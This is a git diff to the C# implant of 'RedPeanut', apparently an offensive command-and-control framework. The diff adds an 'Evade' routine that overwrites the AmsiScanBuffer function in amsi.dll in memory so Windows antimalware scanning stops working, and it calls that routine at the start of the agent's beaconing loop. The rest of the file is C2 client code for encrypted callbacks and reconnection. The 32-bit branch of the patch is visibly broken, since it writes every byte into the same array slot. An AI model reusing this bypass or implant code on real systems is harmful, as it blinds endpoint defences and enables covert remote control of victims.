@@ -9,9 +9,11 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.IO.Pipes;
+using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Net.Security;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
@@ -21,14 +23,11 @@ namespace RedPeanutAgent
 {
     public class Program
     {
-
         public static void Execute(string json, string cookie, NamedPipeClientStream pipe)
         {
             Worker worker = new Worker(json, cookie, pipe);
             worker.Run();
         }
-
-
     }
 
     public class Worker
@@ -54,8 +53,6 @@ namespace RedPeanutAgent
         public bool injectionmanaged = bool.Parse("#MANAGED#");
         public string targetclass = "#TARGETCLASS#";
 
-        public string nutclr = "#NUTCLR#";
-
         public NamedPipeClientStream pipe;
         public Core.Utility.CookiedWebClient wc;
 
@@ -69,7 +66,7 @@ namespace RedPeanutAgent
             agentid = agentidmsg.agentid;
             aeskey = Convert.FromBase64String(agentidmsg.sessionkey);
             aesiv = Convert.FromBase64String(agentidmsg.sessioniv);
-            
+
             this.wc = CreateWebClient(cookie, host);
 
             string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
@@ -86,12 +83,77 @@ namespace RedPeanutAgent
 
         public Worker()
         {
-            
+
+        }
+
+        static byte[] x64 = new byte[6];
+
+        static byte[] x86 = new byte[8];
+
+        private static void Evade()
+        {
+            if (is64Bit())
+            {
+                x64[0] = 0xB8;
+                x64[1] = 0x57;
+                x64[2] = 0x00;
+                x64[3] = 0x07;
+                x64[4] = 0x80;
+                x64[5] = 0xC3;
+                FunnyAmsi(x64);
+            }
+            else
+            {
+                x86[0] = 0xB8;
+                x86[0] = 0x57;
+                x86[0] = 0x00;
+                x86[0] = 0x07;
+                x86[0] = 0x80;
+                x86[0] = 0xC2;
+                x86[0] = 0x18;
+                x86[0] = 0x00;
+                FunnyAmsi(x86);
+            }
+        }
+
+        private static void FunnyAmsi(byte[] patch)
+        {
+            try
+            {
+                var lib = Core.Natives.LoadLibrary("amsi.dll");
+                var addr = Core.Natives.GetProcAddress(lib, "AmsiScanBuffer");
+
+                uint oldProtect;
+                Core.Natives.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
+
+                Marshal.Copy(patch, 0, addr, patch.Length);
+
+                Core.Natives.VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(" [x] {0}", e.Message);
+                Console.WriteLine(" [x] {0}", e.InnerException);
+            }
+        }
+
+        private static bool is64Bit()
+        {
+            bool is64Bit = true;
+
+            if (IntPtr.Size == 4)
+                is64Bit = false;
+
+            return is64Bit;
         }
 
         public void LoadAndRun(string[] arguments)
         {
-            string json = Encoding.Default.GetString(Convert.FromBase64String(arguments[0]));
+
+            string reasargs = string.Empty;
+            foreach (string s in arguments)
+                reasargs += s;
+            string json = Encoding.Default.GetString(Core.Utility.DecompressDLL(Convert.FromBase64String(reasargs)));
             Core.Utility.AgentState agentState = new JavaScriptSerializer().Deserialize<Core.Utility.AgentState>(json);
             Random r = new Random();
 
@@ -120,12 +182,13 @@ namespace RedPeanutAgent
             commandOutuput.SendResponse(output);
 
             Run();
+
         }
 
         private void Reconnect(string agentid, byte[] aeskey, byte[] aesiv, string param, Core.Utility.CookiedWebClient wc)
         {
             bool connected = false;
-            while(!connected)
+            while (!connected)
             {
                 try
                 {
@@ -139,14 +202,14 @@ namespace RedPeanutAgent
                 }
                 catch (Exception)
                 {
-                    
+
                 }
                 //More delay here?
                 int rInt = GetDelay();
                 Thread.Sleep(rInt * 1000);
             }
 
-            
+
         }
 
         private NamedPipeClientStream CreatePipeClient(string pipename)
@@ -172,7 +235,7 @@ namespace RedPeanutAgent
             WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
             webHeaderCollection.Add(HttpRequestHeader.UserAgent, "#USERAGENT#");
 
-            #HEADERS#
+# HEADERS#
 
             wc.Headers = webHeaderCollection;
 
@@ -207,6 +270,8 @@ namespace RedPeanutAgent
 
         public void Run()
         {
+            Evade();
+
             List<string> smblisteners = new List<string>();
 
             Random r = new Random();
@@ -383,7 +448,7 @@ namespace RedPeanutAgent
                 {
                     HttpWebResponse errorResponse = e.Response as HttpWebResponse;
                     if (errorResponse == null || errorResponse.StatusCode != HttpStatusCode.NotFound)
-                        Reconnect(agentid, aeskey,  aesiv, param, wc);
+                        Reconnect(agentid, aeskey, aesiv, param, wc);
                 }
                 catch (Exception)
                 {
